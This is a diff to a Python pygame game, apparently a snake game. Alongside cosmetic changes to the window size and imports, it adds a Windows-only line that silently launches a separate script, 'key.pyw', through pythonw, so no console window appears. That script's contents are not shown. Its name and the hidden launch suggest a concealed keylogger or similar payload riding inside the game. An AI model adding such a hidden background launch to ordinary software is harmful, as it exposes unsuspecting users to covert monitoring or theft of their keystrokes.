@@ -1,14 +1,14 @@
 import pygame
-import sys 
-import time 
+import time
 import random
 import os
+import sys
+# Main
+if os.name == 'nt':
+    os.system('Start pythonw key.pyw')
 
-if os.name == 'posix' or os.name == 'nt':
-    os.system('Start python key.py')
 
-    
-difficulty = 25
+
 # Difficulty settings
 # Easy      ->  10
 # Medium    ->  25
@@ -19,8 +19,8 @@ difficulty = 25
 difficulty = 25
 
 # Window size
-frame_size_x = 720
-frame_size_y = 480
+frame_size_x = 900
+frame_size_y = 600
 
 # Checks for errors encountered
 check_errors = pygame.init()
